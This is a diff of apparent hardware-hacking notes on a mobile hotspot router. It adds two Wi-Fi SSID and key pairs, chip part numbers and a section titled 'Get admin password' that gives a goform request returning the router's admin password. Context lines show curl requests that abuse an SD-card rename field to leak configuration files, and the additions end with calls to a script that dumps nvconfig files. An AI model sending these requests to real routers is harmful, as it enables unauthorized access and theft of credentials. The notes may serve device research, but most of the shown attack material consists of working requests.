@@ -1,7 +1,12 @@
 
-SSID: TPPWF_4D2A7C
-KEY : 87347788DD
+SSID and KEY:
+```
+TPPWF_4D2A7C:87347788DD
+TPPWF_0F5F73:873496E4EC
 
+
+```
+Gobi 3000	Sierra	MC8705	MDM8200
 **sk hynix H9DA1GG51JBM**
 - 1GB RAM / MMC ?
 
@@ -78,7 +83,9 @@ defined.service.connectHotspot({EX_SSID1: 'home',EX_AuthMode: "WPAPSKWPA2PSK", E
                                EX_wifi_profile:"Profile2"})
 ```
 
+## Get admin password
 
+http://192.168.0.1/goform/goform_get_cmd_process?isTest=false&cmd=admin_Password
 
 ## WEB FILE LEAKS
 
@@ -103,3 +110,6 @@ curl --location 'http://192.168.0.1/goform/goform_set_cmd_process' \
 --data-urlencode 'NEW_NAME_SD_CARD=/web/dnsmasq.conf'
 
 curl -i 'http://192.168.0.1/copy/etc/udhcpd.conf'
+
+# ./files.sh /web/userseting_nvconfig.txt
+# ./files.sh /nvconfig_debug
